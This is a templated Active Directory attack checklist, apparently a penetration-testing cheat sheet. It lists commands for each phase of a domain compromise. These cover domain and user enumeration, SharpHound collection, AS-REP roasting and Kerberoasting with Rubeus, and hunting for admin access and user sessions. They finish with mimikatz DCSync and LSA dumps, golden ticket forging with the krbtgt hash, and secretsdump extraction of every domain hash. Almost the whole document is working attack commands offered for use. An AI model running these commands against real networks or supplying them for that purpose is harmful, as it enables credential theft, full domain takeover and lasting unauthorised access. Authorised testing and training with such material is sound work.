# === PHASE 1: DOMAIN CONTEXT ===
# Domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
# Current user and groups
whoami /all
net user {{DOMAIN_USER}} /domain
# Domain admins
net group "Domain Admins" /domain

# === PHASE 2: BLOODHOUND COLLECTION ===
# Run SharpHound (prefer all)
.\SharpHound.exe -c All --zipfilename {{RHOST}}_bh.zip
# Transfer zip back to Kali for BloodHound GUI

# === PHASE 3: USER ENUMERATION ===
# All domain users
net user /domain
# Password policy (look for lockout threshold)
net accounts /domain
# Find AS-REP roastable users (no preauth)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# === PHASE 4: KERBEROASTING ===
# List SPNs
setspn -T {{DOMAIN}} -Q */*
# Kerberoast all
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt

# === PHASE 5: LATERAL MOVEMENT PREP ===
# Check for local admin rights on other hosts
.\Find-LocalAdminAccess.ps1
# Look for sessions of high-value users
.\Invoke-UserHunter.ps1

# === PHASE 6: POST-ROOT DOMAIN ENUM ===
# DCSync (once DA)
.\mimikatz.exe "lsadump::dcsync /domain:{{DOMAIN}} /all /csv" exit
# Extract all hashes from NTDS
.\mimikatz.exe "lsadump::lsa /patch" exit
# Golden ticket prep — get krbtgt hash from DCSync output first
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:{{DOMAIN}} /sid:{{DOMAIN_SID}} /krbtgt:{{KRBTGT_HASH}} /ptt" exit
# Dump all user hashes for cracking
secretsdump.py {{DOMAIN}}/Administrator@{{DC_IP}} -just-dc-ntlm
